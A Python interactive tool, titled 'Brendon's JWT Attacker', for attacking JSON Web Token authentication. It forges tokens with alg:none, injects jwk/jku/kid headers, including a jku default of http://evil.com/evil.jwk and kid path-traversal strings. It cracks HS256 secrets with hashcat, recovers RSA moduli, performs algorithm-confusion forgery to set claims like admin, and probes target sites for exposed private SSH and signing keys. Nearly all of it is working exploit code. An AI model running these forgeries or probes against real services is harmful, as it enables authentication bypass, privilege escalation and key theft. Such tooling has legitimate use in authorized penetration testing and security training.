#!/usr/bin/env python3
import json
import base64
import hmac
import hashlib
import math
from Crypto.PublicKey import RSA
from Crypto.Util.number import bytes_to_long
from hashlib import sha256


# ----------------------------
# Helpers
# ----------------------------

def b64url_decode(data: str) -> bytes:
    padding = "=" * (-len(data) % 4)
    return base64.urlsafe_b64decode(data + padding)


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=").replace("+", "-").replace("/", "_")


def b64url_encode_bytes(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")


def b64url_decode_to_bytes(data: str) -> bytes:
    padding = "=" * (-len(data) % 4)
    return base64.urlsafe_b64decode(data + padding)


def b64url_encode_json(obj) -> str:
    return b64url_encode_bytes(json.dumps(obj, separators=(",", ":")).encode())


def parse_jwt(jwt: str):
    parts = jwt.split(".")
    if len(parts) != 3:
        raise ValueError("JWT must have exactly 3 parts (header.payload.signature)")
    return parts[0], parts[1], parts[2]


def print_banner():
    banner = r"""

                         🔐 Brendon's JWT Attacker 🔐
    """
    print(banner)


def rsa_pubkey_to_jwk(pubkey):
    """
    Convert a PyCryptodome RSA public key into JWK JSON format.
    """
    n_int = pubkey.n
    e_int = pubkey.e
    n_bytes = n_int.to_bytes((n_int.bit_length() + 7) // 8, "big")
    e_bytes = e_int.to_bytes((e_int.bit_length() + 7) // 8, "big")
    return {
        "kty": "RSA",
        "n": base64.urlsafe_b64encode(n_bytes).decode().rstrip("="),  # ✅ fixed typo
        "e": base64.urlsafe_b64encode(e_bytes).decode().rstrip("=")
    }


def jwk_to_pem(jwk_json: str) -> str:
    jwk = json.loads(jwk_json)
    if jwk.get("kty") != "RSA":
        raise ValueError("Only RSA keys are supported.")
    n = bytes_to_long(b64url_decode(jwk["n"]).decode("latin1").encode("latin1")) if isinstance(jwk["n"], bytes) else bytes_to_long(b64url_decode(jwk["n"]))
    e = bytes_to_long(b64url_decode(jwk["e"]).decode("latin1").encode("latin1")) if isinstance(jwk["e"], bytes) else bytes_to_long(b64url_decode(jwk["e"]))
    rsa_key = RSA.construct((n, e))
    pem = rsa_key.publickey().export_key().decode()
    lines = pem.strip().splitlines()
    body = "".join(line for line in lines if "BEGIN" not in line and "END" not in line)
    return body


def inject_jku_or_kid(jwt: str, field: str = "jku", value: str = "http://evil.com/evil.jwk") -> str:
    header_b64, payload_b64, _ = parse_jwt(jwt)
    header = json.loads(b64url_decode_to_bytes(header_b64).decode())
    header[field] = value
    new_header_b64 = b64url_encode_json(header)
    return f"{new_header_b64}.{payload_b64}."


def brute_force_hs256(jwt: str, wordlist_path: str):
    try:
        header_b64, payload_b64, signature_b64 = parse_jwt(jwt)
        signing_input = f"{header_b64}.{payload_b64}"
        signature = b64url_decode_to_bytes(signature_b64)

        with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                candidate = line.strip()
                if not candidate:
                    continue
                test_sig = hmac.new(candidate.encode(), signing_input.encode(), hashlib.sha256).digest()
                if hmac.compare_digest(test_sig, signature):
                    return candidate
        return None
    except Exception as e:
        return f"Error: {e}"


def recover_modulus_from_two_jwts(jwt1: str, jwt2: str):
    try:
        h1, p1, s1 = parse_jwt(jwt1)
        h2, p2, s2 = parse_jwt(jwt2)

        sig1 = bytes_to_long(b64url_decode_to_bytes(s1))
        sig2 = bytes_to_long(b64url_decode_to_bytes(s2))

        m1 = bytes_to_long(sha256(f"{h1}.{p1}".encode()).digest())
        m2 = bytes_to_long(sha256(f"{h2}.{p2}".encode()).digest())

        diff = abs(pow(sig1, 65537) - m1)
        diff2 = abs(pow(sig2, 65537) - m2)
        n = math.gcd(diff, diff2)

        if n.bit_length() < 256:
            return f"❌ Failed: recovered modulus too small ({n.bit_length()} bits)"
        rsa_key = RSA.construct((n, 65537))
        pem = rsa_key.publickey().export_key().decode()
        return f"✅ Recovered modulus (bits: {n.bit_length()}):\n\n{pem}"
    except Exception as e:
        return f"❌ Error: {e}"


# ----------------------------
# Interactive menu
# ----------------------------

def run_interactive():
    print_banner()

    while True:
        print("\nChoose an option:")
        print("1. Convert JWK Public Key into one-line PEM Public Key")
        print("2. Modify parameters in JWT")
        print("3. Inject JWK, JKU or KID into JWT header")
        print("4. Brute-force HS256 JWT secret using wordlist")
        print("5. Attempt modulus recovery from two RS256 JWTs")
        print("6. Forge JWT using JWK Public Key (One-liner string to sign)")
        print("7. Forge JWT using JWK 'k' method (Base64 Encoding of Public Key)")
        print("8. Decode JWT and display header/payload")
        print("9. Probe common JWT/JWKS public key endpoints")
        print("10. Probe for common Private Key endpoints")
        print("11. Convert PEM Public Key into one-line (Body Only)")
        print("12. Convert PEM Public Key into JWK Json Format")
        print("0. Exit")

        choice = input("\nSelect an option: ").strip()

        if choice == "0":
            print("Bye!")
            break

        # ----------------------------
        # 1) JWK -> one-line PEM body
        # ----------------------------
        if choice == "1":
            print("\nPaste your JWK public key JSON, then press Ctrl+D (Linux/macOS) or Ctrl+Z (Windows) and Enter:")
            jwk_input = ""
            try:
                while True:
                    jwk_input += input()
            except EOFError:
                pass
            try:
                oneliner = jwk_to_pem(jwk_input)
                print("\n✅ One-line PEM body:\n")
                print(oneliner)
            except Exception as e:
                print(f"\n❌ Error: {e}")

        # ----------------------------
        # 2) Modify JWT claims + alg
        # ----------------------------
        elif choice == "2":
            jwt = input("\nPaste the original JWT:\n").strip()
            claim_to_modify = input("Which claim do you want to modify (e.g., sub, admin, exp)?\n").strip()
            new_value = input(f"What value should '{claim_to_modify}' be set to?\n").strip()
            new_alg = input("Enter new algorithm (e.g., HS256, none):\n").strip()

            try:
                header_b64, payload_b64, _ = parse_jwt(jwt)
                header = json.loads(b64url_decode_to_bytes(header_b64).decode())
                payload = json.loads(b64url_decode_to_bytes(payload_b64).decode())

                header["alg"] = new_alg
                payload[claim_to_modify] = new_value

                new_header_b64 = b64url_encode_json(header)
                new_payload_b64 = b64url_encode_json(payload)
                signing_input = f"{new_header_b64}.{new_payload_b64}"

                if new_alg.lower() == "none":
                    forged_jwt = f"{signing_input}."
                    print("\n🚫 Algorithm set to 'none'. JWT forged without signature:")
                else:
                    secret = input("Enter the secret to sign the JWT:\n").strip()
                    sig = hmac.new(secret.encode(), signing_input.encode(), hashlib.sha256).digest()
                    sig_b64 = b64url_encode_bytes(sig)
                    forged_jwt = f"{signing_input}.{sig_b64}"
                    print("\n🔏 JWT re-signed with new algorithm and claim:")

                print(f"\n{forged_jwt}")

            except Exception as e:
                print(f"\n❌ Error modifying JWT: {e}")

        # ----------------------------
        # 3) JWK/JKU/KID injection
        # ----------------------------
        elif choice == "3":
            import hashlib
            from Crypto.Signature import pkcs1_15
            from Crypto.Hash import SHA256

            def rsa_generate_keypair(bits: int = 2048):
                key = RSA.generate(bits)
                return key, key.publickey()

            def derive_kid_from_pubkey(pubkey: RSA.RsaKey) -> str:
                spki_der = pubkey.export_key(format="DER")
                digest = hashlib.sha256(spki_der).digest()
                return b64url_encode_bytes(digest[:16])

            def jwk_from_rsa_pubkey(pubkey: RSA.RsaKey, kid: str) -> dict:
                n_int = pubkey.n
                e_int = pubkey.e
                n_b = n_int.to_bytes((n_int.bit_length() + 7) // 8, "big")
                e_b = e_int.to_bytes((e_int.bit_length() + 7) // 8, "big")
                return {"kty": "RSA", "n": b64url_encode_bytes(n_b), "e": b64url_encode_bytes(e_b), "kid": kid}

            def sign_rs256(private_key: RSA.RsaKey, signing_input: str) -> str:
                h = SHA256.new(signing_input.encode())
                sig = pkcs1_15.new(private_key).sign(h)
                return b64url_encode_bytes(sig)

            jwt = input("\nPaste the original JWT:\n").strip()
            try:
                header_b64, payload_b64, _ = parse_jwt(jwt)
                header = json.loads(b64url_decode_to_bytes(header_b64).decode())
                payload = json.loads(b64url_decode_to_bytes(payload_b64).decode())
            except Exception as e:
                print(f"\n❌ Failed to parse JWT: {e}")
                continue

            print("\n📝 Modify payload claims (leave blank to skip):")
            while True:
                field = input("Claim key to modify (or press Enter to continue): ").strip()
                if not field:
                    break
                value = input(f"New value for '{field}': ").strip()
                payload[field] = value
                print(f"✔ Updated {field} -> {value}")

            print("\n🔐 Generating RSA keypair (2048-bit)...")
            priv, pub = rsa_generate_keypair(bits=2048)
            kid_rs = derive_kid_from_pubkey(pub)
            jwk_obj = jwk_from_rsa_pubkey(pub, kid_rs)

            print("\n🎛 Injection options:")
            print("1) Embed JWK only (jwk)")
            print("2) Use JKU (point to hosted JWK Set)")
            print("3) Embed JWK and set JKU")
            print("4) KID injection (path traversal / custom payload)")
            mode = input("Choose an option [1/2/3/4]: ").strip()

            if mode == "4":
                print("\n💡 Choose target OS for KID injection:")
                print("1) Linux (/dev/null)")
                print("2) Windows (NUL or system files)")
                print("3) Custom payload path")
                os_choice = input("Select option [1/2/3]: ").strip()

                try:
                    traversal_count = int(input("\n🔢 How many path traversal sequences to prepend (default 7): ").strip())
                except:
                    traversal_count = 7

                if os_choice == "1":
                    traversal = "../" * traversal_count
                    kid_value = f"{traversal}dev/null"
                elif os_choice == "2":
                    print("\n🪟 Windows targets:")
                    print("1) NUL (null device)")
                    print("2) win.ini")
                    print("3) hosts file")
                    win_choice = input("Select Windows target [1/2/3]: ").strip()
                    traversal = "..\\" * traversal_count
                    if win_choice == "1":
                        kid_value = f"{traversal}NUL"
                    elif win_choice == "2":
                        kid_value = f"{traversal}Windows\\win.ini"
                    else:
                        kid_value = f"{traversal}Windows\\System32\\drivers\\etc\\hosts"
                else:
                    custom_path = input("Enter your custom payload path:\n").strip()
                    traversal = "../" * traversal_count
                    kid_value = f"{traversal}{custom_path}"

                header["alg"] = "HS256"
                header["kid"] = kid_value

                null_secret = base64.b64decode("AA==")  # b'\x00'
                new_header_b64 = b64url_encode_json(header)
                new_payload_b64 = b64url_encode_json(payload)
                signing_input = f"{new_header_b64}.{new_payload_b64}"
                sig = hmac.new(null_secret, signing_input.encode(), hashlib.sha256).digest()
                signature_b64 = b64url_encode_bytes(sig)
                forged = f"{signing_input}.{signature_b64}"

                print("\n✅ Forged JWT with KID injection:\n")
                print(forged)
                print(f"\n🆔 kid set to: {kid_value}")
                continue

            jku_url = None
            if mode in ("2", "3"):
                jku_url = input("Enter the URL of your hosted JWK Set (e.g., https://exploit-server.net/jwks.json): ").strip()
                print("\n📂 To complete the JKU workflow, host this JWKS at that URL:\n")
                print(json.dumps({"keys": [jwk_obj]}, indent=2))

            header["alg"] = "RS256"
            header["kid"] = kid_rs
            if mode in ("1", "3"):
                header["jwk"] = jwk_obj
            if mode in ("2", "3") and jku_url:
                header["jku"] = jku_url

            new_header_b64 = b64url_encode_json(header)
            new_payload_b64 = b64url_encode_json(payload)
            signing_input = f"{new_header_b64}.{new_payload_b64}"
            signature_b64 = sign_rs256(priv, signing_input)
            forged = f"{signing_input}.{signature_b64}"

            print("\n✅ Forged JWT with JWK/JKU injection:\n")
            print(forged)

            print("\n🔑 Generated RSA Private Key (PEM):\n")
            print(priv.export_key().decode())

            print("\n🔓 Generated RSA Public Key (PEM):\n")
            print(pub.export_key().decode())

            if "jwk" in header:
                print("\n🧩 Embedded JWK:\n")
                print(json.dumps(header["jwk"], indent=2))
            if "jku" in header:
                print(f"\n🌐 JKU set to: {header['jku']}")
            print(f"\n🆔 kid derived from public key: {kid_rs}")

        # ----------------------------
        # 4) HS256 brute-force via hashcat
        # ----------------------------
        elif choice == "4":
            import subprocess

            jwt = input("\nPaste the HS256 JWT to brute-force:\n").strip()
            wordlist = input("Enter path to wordlist (e.g., rockyou.txt):\n").strip()

            try:
                parse_jwt(jwt)
            except Exception as e:
                print(f"\n❌ Failed to parse JWT: {e}")
                continue

            print("\n🚀 Running Hashcat to brute-force HS256 secret...")
            try:
                subprocess.run(["hashcat", "-a", "0", "-m", "16500", jwt, wordlist, "--force"], check=True)
                result = subprocess.run(["hashcat", "-m", "16500", jwt, "--show"], capture_output=True, text=True)
                cracked_output = result.stdout.strip()
                if cracked_output:
                    cracked_secret = cracked_output.split(":")[-1]
                    print(f"\n✅ Cracked secret key: {cracked_secret}")
                else:
                    print("\n❌ No secret found in wordlist.")
                    continue
            except Exception as e:
                print(f"\n⚠️ Error running Hashcat: {e}")
                continue

            use_secret = input("\nDo you want to use this secret to modify and re-sign the JWT? (y/n): ").strip().lower()
            if use_secret != "y":
                continue

            header_b64, payload_b64, _ = parse_jwt(jwt)
            header = json.loads(b64url_decode_to_bytes(header_b64).decode())
            payload = json.loads(b64url_decode_to_bytes(payload_b64).decode())

            print("\n📝 Modify payload claims (leave blank to skip):")
            while True:
                field = input("Claim key to modify (or press Enter to continue): ").strip()
                if not field:
                    break
                value = input(f"New value for '{field}': ").strip()
                payload[field] = value
                print(f"✔ Updated {field} -> {value}")

            new_alg = input("Enter new algorithm (default HS256, type 'none' for alg:none):\n").strip()
            if new_alg.lower() == "none":
                header["alg"] = "none"
                new_header_b64 = b64url_encode_json(header)
                new_payload_b64 = b64url_encode_json(payload)
                forged = f"{new_header_b64}.{new_payload_b64}."
                print("\n🚫 Algorithm set to 'none'. JWT forged without signature:\n")
                print(forged)
            else:
                if not new_alg:
                    new_alg = "HS256"
                header["alg"] = new_alg
                new_header_b64 = b64url_encode_json(header)
                new_payload_b64 = b64url_encode_json(payload)
                signing_input = f"{new_header_b64}.{new_payload_b64}"
                sig = hmac.new(cracked_secret.encode(), signing_input.encode(), hashlib.sha256).digest()
                forged = f"{signing_input}.{b64url_encode_bytes(sig)}"
                print("\n🔏 JWT re-signed with cracked secret:\n")
                print(forged)

        # ----------------------------
        # 5) RS* modulus recovery (kept as your original block)
        # ----------------------------
        elif choice == "5":
            # You already have a full advanced gmpy2 implementation here.
            # Leaving as-is except we ensure rsa_pubkey_to_jwk() now works.
            # (Your block uses rsa_pubkey_to_jwk(pubkey) at the end.)
            import json, base64, binascii, hmac, hashlib
            from gmpy2 import mpz, gcd, c_div
            from Crypto.Hash import SHA256, SHA384, SHA512
            from Crypto.Signature import pkcs1_15

            def b64urldecode(b64: str) -> bytes:
                return base64.urlsafe_b64decode(b64 + ("=" * (len(b64) % 4)))

            def b64urlencode(data: bytes) -> str:
                return base64.urlsafe_b64encode(data).decode().rstrip("=")

            def bytes2mpz(b: bytes) -> mpz:
                return mpz(int(binascii.hexlify(b), 16))

            print("\n🔐 Option 5: Brute-forcing RS256/RS384/RS512 JWTs using two tokens (gmpy2 accelerated)\n")

            jwt0 = input("Paste the first JWT (session 1):\n").strip()
            jwt1 = input("Paste the second JWT (session 2):\n").strip()

            try:
                alg0 = json.loads(b64urldecode(jwt0.split(".")[0]))
                alg1 = json.loads(b64urldecode(jwt1.split(".")[0]))
            except Exception as e:
                print(f"\n❌ Failed to parse JWT headers: {e}")
                continue

            if not alg0.get("alg", "").startswith("RS") or not alg1.get("alg", "").startswith("RS"):
                print("\n❌ Both tokens must be RSA-signed (RS256/RS384/RS512).")
                continue

            if alg0["alg"] == "RS256":
                HASH = SHA256
            elif alg0["alg"] == "RS384":
                HASH = SHA384
            elif alg0["alg"] == "RS512":
                HASH = SHA512
            else:
                print("\n❌ Unsupported algorithm in token 1.")
                continue

            try:
                jwt0_sig_bytes = b64urldecode(jwt0.split(".")[2])
                jwt1_sig_bytes = b64urldecode(jwt1.split(".")[2])
            except Exception as e:
                print(f"\n❌ Failed to decode signatures: {e}")
                continue

            if len(jwt0_sig_bytes) != len(jwt1_sig_bytes):
                print("\n❌ Signature lengths differ; cannot proceed.")
                continue

            jwt0_sig = bytes2mpz(jwt0_sig_bytes)
            jwt1_sig = bytes2mpz(jwt1_sig_bytes)

            try:
                jks0_input = ".".join(jwt0.split(".")[0:2])
                hash_0 = HASH.new(jks0_input.encode("ascii"))
                padded0 = pkcs1_15._EMSA_PKCS1_V1_5_ENCODE(hash_0, len(jwt0_sig_bytes))

                jks1_input = ".".join(jwt1.split(".")[0:2])
                hash_1 = HASH.new(jks1_input.encode("ascii"))
                padded1 = pkcs1_15._EMSA_PKCS1_V1_5_ENCODE(hash_1, len(jwt0_sig_bytes))
            except Exception as e:
                print(f"\n❌ Failed to build PKCS#1 padding: {e}")
                continue

            m0 = bytes2mpz(padded0)
            m1 = bytes2mpz(padded1)

            print("\n⚙️ Exponent options:")
            print("1) Try e=3 only (faster)")
            print("2) Try e=3 and e=65537 (more thorough, slower)")
            try:
                exp_choice = int(input("Select option [1/2]: ").strip())
            except:
                exp_choice = 1
            exponents = [mpz(3)] if exp_choice == 1 else [mpz(3), mpz(65537)]

            candidates = []
            for e in exponents:
                try:
                    print(f"\n⏳ Computing GCD for exponent e={int(e)}...")
                    g = gcd(pow(jwt0_sig, e) - m0, pow(jwt1_sig, e) - m1)
                    print("✔ GCD computed. Scanning divisors...")
                except Exception as ex:
                    print(f"⚠️ GCD computation failed for exponent {int(e)}: {ex}")
                    continue

                found_for_e = 0
                for my_gcd in range(1, 101):
                    try:
                        my_n = c_div(g, mpz(my_gcd))
                        if my_n <= 0:
                            continue
                        if pow(jwt0_sig, e, my_n) == m0 and pow(jwt1_sig, e, my_n) == m1:
                            n_int = int(my_n)
                            e_int = int(e)
                            try:
                                pubkey = RSA.construct((n_int, e_int))
                            except ValueError:
                                continue
                            candidates.append(pubkey)
                            found_for_e += 1
                            print(f"✔ Candidate found for e={e_int} (divisor {my_gcd})")
                    except Exception:
                        pass

                if found_for_e == 0:
                    print(f"ℹ️ No valid candidates found for e={int(e)}.")

            if not candidates:
                print("\n❌ No valid candidate public keys recovered.")
                continue

            print(f"\n✅ Recovered {len(candidates)} candidate public key(s):\n")
            for idx, pubkey in enumerate(candidates):
                print(f"--- Candidate #{idx} ---")
                pem = pubkey.export_key().decode()
                print("PEM format:\n")
                print(pem)
                jwk_obj = rsa_pubkey_to_jwk(pubkey)
                print("\nJWK format (JSON):\n")
                print(json.dumps(jwk_obj, indent=2))
                print("------------------------\n")

            # (Your remaining option-5 flow continues; kept as-is originally.)

        # ----------------------------
        # 6) HS256 confusion using PEM body as secret
        # ----------------------------
        elif choice == "6":
            jwt = input("\nPaste the original RS256 JWT:\n").strip()
            print("Paste the RSA public key in JWK format (single-line JSON), then press Ctrl+D (Linux/macOS) or Ctrl+Z (Windows) and Enter:")
            jwk_input = ""
            try:
                while True:
                    jwk_input += input()
            except EOFError:
                pass

            try:
                jwk = json.loads(jwk_input)
                if jwk.get("kty") != "RSA":
                    raise ValueError("Only RSA keys are supported.")
                n = bytes_to_long(b64url_decode_to_bytes(jwk["n"]))
                e = bytes_to_long(b64url_decode_to_bytes(jwk["e"]))
                rsa_key = RSA.construct((n, e))
                pem = rsa_key.publickey().export_key().decode()
                lines = pem.strip().splitlines()
                one_liner_pem = "".join(line for line in lines if "BEGIN" not in line and "END" not in line)

                header_b64, payload_b64, _ = parse_jwt(jwt)
                header = json.loads(b64url_decode_to_bytes(header_b64))
                payload = json.loads(b64url_decode_to_bytes(payload_b64))

                claim_key = input("Enter the claim name to modify (e.g., sub, username, preferred_username): ").strip()
                new_value = input(f"Enter new value for '{claim_key}' (e.g., admin): ").strip()
                if claim_key not in payload:
                    print(f"\n⚠️ Claim '{claim_key}' not found in payload. Available keys: {list(payload.keys())}")
                payload[claim_key] = new_value

                header["alg"] = "HS256"

                new_header_b64 = b64url_encode_json(header)
                new_payload_b64 = b64url_encode_json(payload)
                signing_input = f"{new_header_b64}.{new_payload_b64}"
                signature = b64url_encode_bytes(hmac.new(one_liner_pem.encode(), signing_input.encode(), hashlib.sha256).digest())
                forged_jwt = f"{signing_input}.{signature}"

                print("\n✅ Forged JWT using one-liner PEM body as HMAC key:\n")
                print(forged_jwt)
            except Exception as e:
                print(f"\n❌ Error: {e}")

        # ----------------------------
        # 7) JWK 'k' method (oct) using PEM bytes
        # ----------------------------
        elif choice == "7":
            jwt = input("\nPaste the original RS256 JWT:\n").strip()
            print("Paste the RSA public key in JWK format (single-line JSON), then press Ctrl+D (Linux/macOS) or Ctrl+Z (Windows) and Enter:")
            jwk_input = ""
            try:
                while True:
                    jwk_input += input()
            except EOFError:
                pass

            try:
                jwk = json.loads(jwk_input)
                if jwk.get("kty") != "RSA":
                    raise ValueError("Only RSA keys are supported.")
                n = bytes_to_long(b64url_decode_to_bytes(jwk["n"]))
                e = bytes_to_long(b64url_decode_to_bytes(jwk["e"]))
                rsa_key = RSA.construct((n, e))
                pem = rsa_key.publickey().export_key(format="PEM").decode() + "\n"
                pem_bytes = pem.encode()
                b64_pem = b64url_encode(pem_bytes)

                header_b64, payload_b64, _ = parse_jwt(jwt)
                header = json.loads(b64url_decode_to_bytes(header_b64))
                payload = json.loads(b64url_decode_to_bytes(payload_b64))

                claim_key = input("Enter the claim name to modify (e.g., sub, username, preferred_username): ").strip()
                new_value = input(f"Enter new value for '{claim_key}' (e.g., admin): ").strip()
                if claim_key not in payload:
                    print(f"\n⚠️ Claim '{claim_key}' not found in payload. Available keys: {list(payload.keys())}")
                payload[claim_key] = new_value

                header["alg"] = "HS256"
                header["jwk"] = {"kty": "oct", "k": b64_pem}

                new_header_b64 = b64url_encode_json(header)
                new_payload_b64 = b64url_encode_json(payload)
                signing_input = f"{new_header_b64}.{new_payload_b64}"
                signature = b64url_encode_bytes(hmac.new(pem_bytes, signing_input.encode(), hashlib.sha256).digest())
                forged_jwt = f"{signing_input}.{signature}"

                print("\n✅ Forged JWT using JWK 'k' method with modified claim:\n")
                print(forged_jwt)
            except Exception as e:
                print(f"\n❌ Error: {e}")

        # ----------------------------
        # 8) Decode JWT
        # ----------------------------
        elif choice == "8":
            jwt = input("\nPaste the JWT to decode:\n").strip()
            try:
                header_b64, payload_b64, signature_b64 = parse_jwt(jwt)
                header = json.loads(b64url_decode_to_bytes(header_b64).decode())
                payload = json.loads(b64url_decode_to_bytes(payload_b64).decode())

                print("\n📦 Decoded JWT Header:")
                print(json.dumps(header, indent=4))

                print("\n📨 Decoded JWT Payload:")
                print(json.dumps(payload, indent=4))

                print("\n🔏 Signature (base64url):")
                print(signature_b64)
            except Exception as e:
                print(f"\n❌ Failed to decode JWT: {e}")

        # ----------------------------
        # 9) Probe JWKS/public key endpoints
        # ----------------------------
        elif choice == "9":
            import requests
            import urllib3
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

            paths = [
                "/api/keys", "/api/jwks", "/api/jwt/keys", "/api/auth/keys",
                "/api/v1/keys", "/api/v1/jwks",
                "/public/jwks.json", "/public/keys",
                "/.well-known/openid-configuration", "/.well-known/oauth-authorization-server",
                "/jwks.json", "/.well-known/jwks.json"
            ]

            base_url = input("\nEnter the base URL (e.g., https://target.com):\n").strip().rstrip("/")

            headers = {}
            cookies = {}

            print("\n🔐 Authentication setup:")
            print("You can add multiple Bearer tokens, cookies, or custom headers.")
            print("Type 'done' when finished, or just press Enter to skip.\n")

            while True:
                auth_type = input("Add [bearer/cookie/header/done]: ").strip().lower()
                if auth_type in ("done", ""):
                    break
                elif auth_type == "bearer":
                    token = input("Enter Bearer token:\n").strip()
                    # NOTE: multiple Authorization headers aren't really supported in HTTP;
                    # keeping your original behavior but it may not work as intended.
                    headers["Authorization"] = f"Bearer {token}"
                elif auth_type == "cookie":
                    cookie_name = input("Enter cookie name:\n").strip()
                    cookie_value = input("Enter cookie value:\n").strip()
                    cookies[cookie_name] = cookie_value
                elif auth_type == "header":
                    header_name = input("Enter header name:\n").strip()
                    header_value = input("Enter header value:\n").strip()
                    headers[header_name] = header_value
                else:
                    print("❌ Unknown type. Use bearer/cookie/header/done.")

            def fuzz_paths(session, label="Authenticated"):
                print(f"\n🔍 Probing for public key endpoints ({label})...\n")
                for path in paths:
                    full_url = f"{base_url}{path}"
                    print(f"➡️  Checking: {full_url}")
                    try:
                        response = session.get(full_url, timeout=5, verify=False, allow_redirects=True)
                        if response.status_code == 200 and response.text.strip():
                            print(f"\n✅ 200 OK — Possible key material found at {response.url}:\n")
                            print(response.text.strip())
                            print("-" * 60)
                        else:
                            print(f"❌ {response.status_code} — No key found or access denied at {response.url}.\n")
                    except requests.RequestException as e:
                        print(f"⚠️ Error accessing {full_url}:\n{e}\n")

            if headers or cookies:
                session = requests.Session()
                session.headers.update(headers)
                session.cookies.update(cookies)
                fuzz_paths(session, "Authenticated")

            session = requests.Session()
            fuzz_paths(session, "Unauthenticated")

        # ----------------------------
        # 10) Probe private key endpoints
        # ----------------------------
        elif choice == "10":
            import requests
            import urllib3
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

            paths = [
                "/id_rsa", "/id_rsa.pub", "/jwt.key", "/jwt/private.key", "/jwt/private.pem",
                "/keys/private.pem", "/keys/private.key", "/config/private.pem", "/config/private.key",
                "/.ssh/id_rsa", "/.ssh/id_dsa", "/.ssh/id_ecdsa", "/.ssh/id_ed25519",
                "/.well-known/private.pem", "/.well-known/private.key",
                "/certs/private.pem", "/certs/private.key",
                "/secrets/jwt.key", "/secrets/private.pem", "/secrets/private.key"
            ]

            base_url = input("\nEnter the base URL (e.g., https://target.com):\n").strip().rstrip("/")

            headers = {}
            cookies = {}

            print("\n🔐 Authentication setup:")
            print("You can add multiple Bearer tokens, cookies, or custom headers.")
            print("Type 'done' when finished, or just press Enter to skip.\n")

            while True:
                auth_type = input("Add [bearer/cookie/header/done]: ").strip().lower()
                if auth_type in ("done", ""):
                    break
                elif auth_type == "bearer":
                    token = input("Enter Bearer token:\n").strip()
                    headers["Authorization"] = f"Bearer {token}"
                elif auth_type == "cookie":
                    cookie_name = input("Enter cookie name:\n").strip()
                    cookie_value = input("Enter cookie value:\n").strip()
                    cookies[cookie_name] = cookie_value
                elif auth_type == "header":
                    header_name = input("Enter header name:\n").strip()
                    header_value = input("Enter header value:\n").strip()
                    headers[header_name] = header_value
                else:
                    print("❌ Unknown type. Use bearer/cookie/header/done.")

            def fuzz_paths(session, label="Authenticated"):
                print(f"\n🔍 Probing for private key endpoints ({label})...\n")
                for path in paths:
                    full_url = f"{base_url}{path}"
                    print(f"➡️  Checking: {full_url}")
                    try:
                        response = session.get(full_url, timeout=5, verify=False, allow_redirects=True)
                        if response.status_code == 200 and response.text.strip():
                            print(f"\n✅ 200 OK — Possible private key material found at {response.url}:\n")
                            print(response.text.strip())
                            print("-" * 60)
                        else:
                            print(f"❌ {response.status_code} — No key found or access denied at {response.url}.\n")
                    except requests.RequestException as e:
                        print(f"⚠️ Error accessing {full_url}:\n{e}\n")

            if headers or cookies:
                session = requests.Session()
                session.headers.update(headers)
                session.cookies.update(cookies)
                fuzz_paths(session, "Authenticated")

            session = requests.Session()
            fuzz_paths(session, "Unauthenticated")

        # ----------------------------
        # 11) PEM -> one-liner body
        # ----------------------------
        elif choice == "11":
            print("\n🔧 Option 11: Convert PEM public key to one-liner body only\n")
            pem_input = []
            print("Paste your PEM public key (end with an empty line):")
            while True:
                line = input()
                if not line.strip():
                    break
                pem_input.append(line.strip())

            body_lines = [line for line in pem_input if not line.startswith("-----BEGIN") and not line.startswith("-----END")]
            one_liner = "".join(body_lines)

            print("\n✅ One-liner public key body:\n")
            print(one_liner)

        # ----------------------------
        # 12) PEM -> JWK JSON
        # ----------------------------
        elif choice == "12":
            print("\n🔧 Option 12: Convert PEM public key into JWK JSON format\n")
            print("Paste your PEM public key (end with an empty line):")

            pem_lines = []
            while True:
                line = input()
                if not line.strip():
                    break
                pem_lines.append(line)

            pem_data = "\n".join(pem_lines)
            if not pem_data.endswith("\n"):
                pem_data += "\n"

            try:
                pubkey = RSA.import_key(pem_data)

                n_int = pubkey.n
                e_int = pubkey.e

                n_bytes = n_int.to_bytes((n_int.bit_length() + 7) // 8, "big")
                e_bytes = e_int.to_bytes((e_int.bit_length() + 7) // 8, "big")

                jwk = {
                    "kty": "RSA",
                    "n": base64.urlsafe_b64encode(n_bytes).decode().rstrip("="),
                    "e": base64.urlsafe_b64encode(e_bytes).decode().rstrip("=")
                }

                print("\n✅ JWK JSON format:\n")
                print(json.dumps(jwk, indent=2))

            except Exception as ex:
                print(f"\n❌ Failed to convert PEM to JWK: {ex}")

        else:
            print("❌ Invalid choice. Try again.")


if __name__ == "__main__":
    run_interactive()
